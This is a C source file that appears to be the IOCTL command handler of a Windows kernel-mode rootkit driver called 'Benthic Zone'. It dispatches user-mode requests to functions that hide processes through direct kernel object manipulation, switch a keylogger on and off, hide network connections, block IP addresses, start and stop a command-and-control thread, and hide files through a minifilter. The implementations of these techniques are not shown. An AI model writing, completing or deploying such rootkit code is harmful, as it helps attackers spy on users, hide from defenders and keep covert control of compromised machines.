// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/
// This header contains reference material that includes specific details about the routines, structures, and data types that you will need to use to write kernel-mode drivers.
#include <wdm.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/
// If you use the safe string functions instead of the string manipulation functions that are provided by C-language run-time libraries, you protect your code from buffer overrun errors that can make code untrustworthy. This header declares functions that copy, concatenate, and format strings in a manner that prevents buffer overrun errors.
#include <ntstrsafe.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "../Globals/Globals00IOCTLs.h"
#include "Techniques/DirectKernelObjectManipulation.h"
#include "Techniques/KeyboardFilter.h"
#include "Techniques/NetworkStoreInterface.h"
#include "Techniques/WindowsFilteringPlatform.h"
#include "Techniques/WinSockKernel.h"
#include "Techniques/MiniFilter.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------


/**
	@brief      Handles IOCTL requests and returns appropriate responses.


	@see        ULONG                   https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#ULONG
	@param[in]  controlCode             The IOCTL code sent from user-mode.

	@see        PVOID                   https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#PVOID
	@param[in]  inputBuffer             Pointer to input data buffer.

	@see        CHAR                    https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#CHAR
	@param[out] responseBuffer          Pointer to output data buffer.

	@see        SIZE_T                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#SIZE_T
	@param[in]  responseBufferSize      Size of the output buffer.


	@retval     A NTSTATUS value indicating success or an error code.
**/
NTSTATUS
UtilsIOCTLs_HandleRequest(
	_In_        ULONG                   controlCode,
	_In_        PVOID                   inputBuffer,
	_Out_       CHAR*                   responseBuffer,
	_In_        SIZE_T                  responseBufferSize
)
{
	UNREFERENCED_PARAMETER(inputBuffer);
	// -------------------------------------------------------------------------------------------------------------------------
	// Handle incoming IOCTL control codes
	switch (controlCode)
	{

		// ---------------------------------------------------------------------------------------------------------------------
		// HELLO
		case GLOBALS_IOCTLS_COMMAND_GENERAL_HELLO:

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received IOCTL_HELLO");

			// -----------------------------------------------------------------------------------------------------------------
			// Copy the response message to the output buffer for user-mode

			// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "Hello from kernel-mode!");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_SUCCESS;


		// ---------------------------------------------------------------------------------------------------------------------
		// DIRECT KERNEL OBJECT MODIFICATION - HIDE PROCESS
		case GLOBALS_IOCTLS_COMMAND_DKOM_HIDE_PROCESS:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_DKOM_HIDE_PROCESS");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Parse input buffer as integer
			ULONG pidToHide;

			// The RtlCharToInteger routine converts a single-byte character string to an integer value in the specified base.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-rtlchartointeger
			if (!NT_SUCCESS(RtlCharToInteger((char*)inputBuffer, 10, &pidToHide)))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Failed to parse PID from input.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to parse PID from input.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Hiding process with PID %lu\n", pidToHide);

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to hide the target process
			return TechniquesDirectKernelObjectManipulation_Hide(responseBuffer, responseBufferSize, pidToHide);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// DIRECT KERNEL OBJECT MODIFICATION - LIST HIDDEN PROCESSES
		case GLOBALS_IOCTLS_COMMAND_DKOM_LIST_HIDDEN_PROCESSES:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_DKOM_LIST_HIDDEN_PROCESSES");

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Listing hidden processes");

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to list all hidden processes
			return TechniquesDirectKernelObjectManipulation_List(responseBuffer, responseBufferSize);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// DIRECT KERNEL OBJECT MODIFICATION - UNHIDE PROCESS
		case GLOBALS_IOCTLS_COMMAND_DKOM_UNHIDE_PROCESS:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_DKOM_UNHIDE_PROCESS");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -------------------------------------------------------------------------------------------------------------
			// Parse input buffer as integer
			ULONG indexToUnhide;

			// The RtlCharToInteger routine converts a single-byte character string to an integer value in the specified base.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-rtlchartointeger
			if (!NT_SUCCESS(RtlCharToInteger((char*)inputBuffer, 10, &indexToUnhide)))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Failed to parse index from input.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to parse index from input.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Unhiding process at index %lu\n", indexToUnhide);

			// -------------------------------------------------------------------------------------------------------------
			// Call logic to unhide the process by index
			return TechniquesDirectKernelObjectManipulation_Unhide(responseBuffer, responseBufferSize, indexToUnhide);
		}


		
		// ---------------------------------------------------------------------------------------------------------------------
		// KEYLOGGER - ON
		case GLOBALS_IOCTLS_COMMAND_KEYBOARD_ENABLE_KEYLOGGER:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received UTILSIOCTLS_COMMAND_ENABLE_KEYLOGGER");

			// -----------------------------------------------------------------------------------------------------------------
			// Enable Keylogger
			TechniquesKeyboardFilter_KeyloggerOn();

			// -----------------------------------------------------------------------------------------------------------------
			// Message

			// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "Keylogger enabled.");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_SUCCESS;
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// KEYLOGGER - OFF
		case GLOBALS_IOCTLS_COMMAND_KEYBOARD_DISABLE_KEYLOGGER:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_KEYBOARD_DISABLE_KEYLOGGER");

			// -----------------------------------------------------------------------------------------------------------------
			// Disable Keylogger
			TechniquesKeyboardFilter_KeyloggerOff();

			// -----------------------------------------------------------------------------------------------------------------
			// Message

			// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "Keylogger disabled.");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_SUCCESS;
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// NETWORK STORE INTERFACE - HIDE CONNECTIONS
		case GLOBALS_IOCTLS_COMMAND_NSI_HIDE_CONNECTIONS:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_NSI_HIDE_CONNECTIONS");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Hiding port %s\n", (char*)inputBuffer);

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to hide the port
			return TechniquesNetworkStoreInterface_Hide(responseBuffer, responseBufferSize, (char*)inputBuffer);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// NETWORK STORE INTERFACE - LIST HIDDEN CONNECTIONS
		case GLOBALS_IOCTLS_COMMAND_NSI_LIST_HIDDEN_CONNECTIONS:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_NSI_LIST_HIDDEN_CONNECTIONS");

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Listing hidden ports");

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to list all hidden ports
			return TechniquesNetworkStoreInterface_List(responseBuffer, responseBufferSize);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// NETWORK STORE INTERFACE - UNHIDE CONNECTIONS
		case GLOBALS_IOCTLS_COMMAND_NSI_UNHIDE_CONNECTIONS:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_NSI_UNHIDE_CONNECTIONS");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -------------------------------------------------------------------------------------------------------------
			// Parse input buffer as integer
			ULONG indexToUnhide;

			if (!NT_SUCCESS(RtlCharToInteger((char*)inputBuffer, 10, &indexToUnhide)))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Failed to parse index from input.");
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to parse index from input.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Unhiding port at index %lu\n", indexToUnhide);

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to unhide the port by index
			return TechniquesNetworkStoreInterface_Unhide(responseBuffer, responseBufferSize, indexToUnhide);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// WINDOWS FILTERING PLATFORM - BLOCK IP
		case GLOBALS_IOCTLS_COMMAND_WFP_BLOCK_CONNECTION:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_WFP_BLOCK_CONNECTION");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Blocking IP %s\n", (char*)inputBuffer);

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to block the target ip
			return TechniquesWindowsFilteringPlatform_Block(responseBuffer, responseBufferSize, (char*)inputBuffer);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// WINDOWS FILTERING PLATFORM - LIST BLOCKED IPs
		case GLOBALS_IOCTLS_COMMAND_WFP_LIST_BLOCKED_CONNECTIONS:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_WFP_LIST_BLOCKED_CONNECTIONS");

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Listing blocked IPs");

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to list all blocked ip addresses
			return TechniquesWindowsFilteringPlatform_List(responseBuffer, responseBufferSize);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// WINDOWS FILTERING PLATFORM - UNBLOCK IP
		case GLOBALS_IOCTLS_COMMAND_WFP_UNBLOCK_CONNECTION:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_WFP_UNBLOCK_CONNECTION");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -------------------------------------------------------------------------------------------------------------
			// Parse input buffer as integer
			ULONG indexToUnblock;

			// The RtlCharToInteger routine converts a single-byte character string to an integer value in the specified base.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-rtlchartointeger
			if (!NT_SUCCESS(RtlCharToInteger((char*)inputBuffer, 10, &indexToUnblock)))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Failed to parse index from input.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to parse index from input.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Unblocking IP at index %lu\n", indexToUnblock);

			// -------------------------------------------------------------------------------------------------------------
			// Call logic to unblock the ip by index
			return TechniquesWindowsFilteringPlatform_Unblock(responseBuffer, responseBufferSize, indexToUnblock);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// WINSOCK KERNEL - ENABLE C2
		case GLOBALS_IOCTLS_COMMAND_WSK_ENABLE_C2:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_WSK_ENABLE_C2");

			// -----------------------------------------------------------------------------------------------------------------
			// Start Thread
			NTSTATUS status = TechniquesWinSockKernel_StartWSKThread();

			// Failed
			if (!NT_SUCCESS(status))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Failed to start WSK thread (Status 0x%08X).\n", status);
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to start C2 thread.");
				return status;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Message

			// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "C2 thread started.");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_SUCCESS;
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// WINSOCK KERNEL - DISABLE C2
		case GLOBALS_IOCTLS_COMMAND_WSK_DISABLE_C2:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_WSK_DISABLE_C2");

			// -----------------------------------------------------------------------------------------------------------------
			// Stop Thread
			TechniquesWinSockKernel_StopWSKThread();

			// -----------------------------------------------------------------------------------------------------------------
			// Message

			// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "C2 thread stopped.");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_SUCCESS;
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// MINIFILTER - HIDE FILE
		case GLOBALS_IOCTLS_COMMAND_MINI_HIDE_FILE:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_MINI_HIDE_FILE");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Hiding file %s\n", (char*)inputBuffer);

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to hide the target file
			return TechniquesMiniFilter_Hide(responseBuffer, responseBufferSize, (char*)inputBuffer);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// MINIFILTER - LIST HIDDEN FILES
		case GLOBALS_IOCTLS_COMMAND_MINI_LIST_HIDDEN_FILES:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_MINI_LIST_HIDDEN_FILES");

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Listing hidden files");

			// -----------------------------------------------------------------------------------------------------------------
			// Call logic to list all hidden files
			return TechniquesMiniFilter_HideUnhideFile_List(responseBuffer, responseBufferSize);
		}


		// ---------------------------------------------------------------------------------------------------------------------
		// MINIFILTER - UNHIDE FILE
		case GLOBALS_IOCTLS_COMMAND_MINI_UNHIDE_FILE:
		{

			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Received GLOBALS_IOCTLS_COMMAND_MINI_UNHIDE_FILE");

			// -----------------------------------------------------------------------------------------------------------------
			// Ensure input buffer is not null
			if (!inputBuffer)
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Input buffer is null.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Input buffer is null.");
				return STATUS_INVALID_PARAMETER;
			}

			// -------------------------------------------------------------------------------------------------------------
			// Parse input buffer as integer
			ULONG indexToUnhide;

			// The RtlCharToInteger routine converts a single-byte character string to an integer value in the specified base.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-rtlchartointeger
			if (!NT_SUCCESS(RtlCharToInteger((char*)inputBuffer, 10, &indexToUnhide)))
			{
				DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - ERROR: Failed to parse index from input.");
				// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
				RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to parse index from input.");
				return STATUS_INVALID_PARAMETER;
			}

			// -----------------------------------------------------------------------------------------------------------------
			// Debug message
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Unhiding file at index %lu\n", indexToUnhide);

			// -------------------------------------------------------------------------------------------------------------
			// Call logic to unhide the file by index
			return TechniquesMiniFilter_Unhide(responseBuffer, responseBufferSize, indexToUnhide);
		}



		// ---------------------------------------------------------------------------------------------------------------------
		// UNKNOWN
		default:
		{
			// -----------------------------------------------------------------------------------------------------------------
			// Print debug message to indicate the command was received
			DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IOCTLs.c] (HandleRequest) - Unknown IOCTL code 0x%08X\n", controlCode);

			// -----------------------------------------------------------------------------------------------------------------
			// Message
			RtlStringCbCopyA(responseBuffer, responseBufferSize, "Unknown IOCTL.");

			// -----------------------------------------------------------------------------------------------------------------
			// Return
			return STATUS_INVALID_DEVICE_REQUEST;
		}
	}
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
